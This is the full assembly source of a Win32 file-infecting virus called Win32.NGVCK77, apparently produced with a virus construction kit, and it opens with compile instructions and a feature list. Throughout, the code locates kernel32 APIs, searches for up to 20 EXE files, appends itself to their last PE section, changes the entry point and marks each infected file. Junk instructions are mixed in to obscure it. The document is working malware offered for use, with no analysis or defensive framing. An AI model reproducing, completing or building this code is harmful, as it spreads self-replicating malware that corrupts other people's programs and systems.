              
;
;
; Win32.NGVCK77 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK77
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 27
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop edx
 sub edx, offset Delta
                                        ; mov ebp, edx
                                        ; clear ebp
 mov ebp, 0
 add ebp, edx
 jmp KernelSearchStart


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edx, [ecx+3Ch]
 add edx, ecx
                                        ; get File Alignment
 mov ecx, [edx+3Ch]
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], ecx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edi, dword ptr [esi+3Ch]
 add edi, esi
                                        ; infect by increasing the last section
 mov esi, edi
                                        ; get last section
                                        ; clear edx
 xor edx, edx
 mov dx, word ptr [esi+06h]
 sub edx, 1
 imul edx, edx, 28h
 add edi, edx
                                        ; add edi, 120
 dec edi
 add edi, 121d
 mov ebx, dword ptr [esi+74h]
 shl ebx, 3
 and dword ptr [ebp+Trash1], 12053      ; Trash
 add edi, ebx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], -1
 and dword ptr [ebp+OldBase], eax
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 add dword ptr [ebp+OldEIP], eax
 mov ecx, [edi+10h]
                                        ; mov eax, ecx
 mov eax, ecx
 add edi, 14h
 add ecx, [edi]
 sub edi, 14h
 push ecx
 push eax
 pop edx
 add edi, 0Ch
 add edx, [edi]
 sub edi, 0Ch
 mov dword ptr [ebp+NewEIP], edx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], edx
                                        ; clear edx
 push 0
 pop edx

 add edx, [edi+10h]
 push edx
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add edx, VirusSize
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], edx
 call Align
 inc dword ptr [ebp+Trash1]             ; Trash
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [edi+10h], edx
 neg ebx                                ; Trash
 pop edx
 add edx, VirusSize
 mov dword ptr [edi+08h], 0
 add dword ptr [edi+08h], edx
 mov edx, dword ptr [edi+10h]
 add edx, dword ptr [edi+0Ch]
 mov dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [edi+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov esi, ebp
 not ebx                                ; Trash
 add esi, offset Virus
 shl ebx, 29d                           ; Trash

 mov eax, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov eax, dword ptr [ebp+InfCounter]
 add eax, -1
 mov dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop ecx

 push ecx
 pop dword ptr [ebp+retEIP]

                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 dec ebp
 add ebp, 1
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 push ebx
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 sal eax, 7d                            ; Trash
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg edi, ecx

 push edi
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edx, [ebp+WFD_szFileName]
 xchg edx, esi

                                        ; mov eax, 276
 mov eax, ( 276d - 21d )
 add eax, 21d

ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 sub esi, -1d
 dec eax
 jnz ClearOldData2
 popad
ret
 and ecx, 21752213d                     ; Trash


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg esi, ebx

 push esi
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 shr eax, 1d                            ; Trash
 call dword ptr [ebp+XFindNextFileA]
ret





;                  [ ///// * Data * \\\\\ ]

Data:
 InfCounter  dd 0h
 MapAddress  dd 0h
 FileHandle  dd 0h
 NTableVA    dd 0h
 AlignReg2   dd 0h
 FindHandle  dd 0h
 KernelPE    dd 0h
 AlignReg1   dd 0h
 TempAPI     dd 0h
 filemask    db '*.EXe',0

 APIOffsets:
 XCloseHandle           dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h
 XCreateFileMappingA    dd 0h
 XMapViewOfFile         dd 0h
 XSetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XGetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h

 KernelMZ    dd 0h
 ATableVA    dd 0h
 OldBase     dd 400000h
 db 'Win32.NGVCK77 by SnakeByte',0
 MapHandle   dd 0h
 NewEIP      dd 0h
 Attributes  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 Trash1      dd 0h

 APINames:
 db 'CloseHandle', 0
 db 'UnmapViewOfFile', 0
 db 'FindClose', 0
 db 'CreateFileMappingA', 0
 db 'MapViewOfFile', 0
 db 'SetFileAttributesA', 0
 db 'CreateFileA', 0
 db 'GetFileAttributesA', 0
 db 'FindNextFileA', 0
 db 'FindFirstFileA', 0

 OTableVA    dd 0h
 OldEIP      dd 0h
 TempApisearch3 dd 0h
 NewSize     dd 0h
 counter     dw 0h




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], edi

 mov esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov ebx, 20
 mov ebx, ( 20d - 14d )
 add ebx, 14d
 mov dword ptr [ebp+InfCounter], ebx
 lea ecx, [ebp+filemask]
 xchg ecx, edx

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 xor eax, 93511892d                     ; Trash
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ebx, NumberOfApis
 add ecx, ebx                           ; Trash

                                        ; load API Names and Offsets
 mov edi, ebp
 add edi, offset APIOffsets

 mov ecx, ebp
 add ecx, offset APINames


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 push ecx
 pop edx
APINameDetect:                          ; calculate the lenght of the names
 add edx, 1d
 cmp byte ptr [edx], 0
 jne APINameDetect

 push edx
 sub dword ptr [esp], ecx
 pop edx
                                        ; search 'em
                                        ; edx contains Name-Lenght
                                        ; ecx points to the Name
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add ecx, 1
 sub ecx, -1d
 push ecx
 add dword ptr [esp], edx
 pop ecx
 mov eax, dword ptr [ebp+TempAPI]
 xor dword ptr [ebp+Trash1], 1985913    ; Trash
 mov dword ptr [edi], 0
 add dword ptr [edi], eax
                                        ; add edi, 4
 add edi, 4d
 sub ebx, 1
 jnz GetApisLoop
 jmp Outbreak



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 and ebx, 0

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 add ebx, 1d
 push ebx
 push 80000000h or 40000000h
 mov edx, offset WFD_szFileName
 add edx, ebp

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
 push ecx
 add ebx, ecx                           ; Trash

                                        ; clear edx
 and edx, 0
 push edx
 push ecx
 push edx
 push 00000004h
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz CloseFile
                                        ; clear edx
 mov edx, 43444d
 sub edx, 43444d
 push ecx
 push edx
 push edx
                                        ; mov eax, 2
 mov eax, 0
 add eax, 2d
 push eax
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea ecx, [ebp+WFD_szFileName]
 xchg eax, ecx

 push eax
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov ecx, 128
 mov ecx, ( 128d + 9d )
 sub ecx, 9d
 push ecx
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, eax


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 sub eax, 1
 add eax, 1
 jz NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear eax
 xor eax, eax
 xor eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
 jmp Notagoodfile
 sub dword ptr [ebp+Trash1], ecx        ; Trash

Goodfile:
 cmp word ptr [eax+3Ch], 0h
 je Notagoodfile
 push dword ptr [eax+3Ch]
 pop esi
                                        ; check if header lies inside the file
 cmp esi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add esi, eax
                                        ; check for PE Header
                                        ; check for EP
 movzx ebx, word ptr [esi]
 cmp ebx, 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], 'NGVC'
 jnz yNotagoodfile
 mov dword ptr [ebp+Trash1], 557100     ; Trash
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov dx, word ptr [esi+16h]
 and dx, 0F000h
 cmp dx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

 inc ebx                                ; Trash
                                        ; restore the file attributes
                                        ; clear ebx
 push 0
 pop ebx
 xor ebx, dword ptr [ebp+Attributes]
 push ebx
 lea ebx, [ebp+WFD_szFileName]
 xchg ecx, ebx

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop edx
 push edx
                                        ; round to pages
 sub dx, dx
                                        ; add edx, 1
 sub edx, -1d
GetKernelLoop:
                                        ; clear ebx
 push 0
 pop ebx
 add edx, -1
 mov bx, word ptr [edx+03ch]
 cmp bx,0f800h
 je GetKernelLoop
 cmp edx, dword ptr [edx+ebx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], edx
 mov ebx, edx
 add ebx, [edx+3Ch]
 mov [KernelPE+ebp], ebx

 mov edx, offset GetApis
 add edx, ebp

 push edx
 inc dword ptr [ebp+Trash1]             ; Trash
ret

;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Lenght of API-Name
                                        ; ecx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad


 dec dword ptr [ebp+Trash1]             ; Trash

                                        ; clear eax
 mov eax, 0
 add eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov esi, [eax+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 add esi, 28d
                                        ; get ATableVA
 mov eax, dword ptr [esi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; add esi, 4
 add esi, 4d
                                        ; get NTableVA
 mov eax, dword ptr [esi]
                                        ; add esi, 4
 inc esi
 add esi, 3d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [esi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
                                        ; mov eax, -1
 mov eax, ( -1d xor 0d )
 xor eax, 0d
 and eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
                                        ; mov ebx, -1
 mov ebx, 0
 add ebx, -1d
 and ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [eax]
                                        ; mov eax, ebx
 push ebx
 pop eax
                                        ; mov edi, eax
 mov edi, eax
 push edx
 push edi
 push ecx
 pop dword ptr [ebp+TempApisearch3]
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ecx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov bl, byte ptr [ecx]
 cmp bl, byte ptr [edi]
 jne ApiNotFound
 sub edx, 1
                                        ; add edx, 1
 inc edx
 dec edx
 jz FoundApi1
                                        ; add edi, 1
 inc edi
                                        ; add ecx, 1
 add ecx, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop edx
 pop eax
                                        ; mov ecx, -1
 mov ecx, -1d
 and ecx, dword ptr [ebp+TempApisearch3]
                                        ; add eax, 4
 add eax, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 12d
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 xchg ebx, eax
                                        ; clear ebx
 mov ebx, 0
 mov bx, word ptr [eax]
 shl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 pop eax
 add eax, dword ptr [ebx]
 mov dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 sub edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 sub ecx, ecx
 push ecx
 neg edx                                ; Trash
 call ExitProcess



end FakeCode

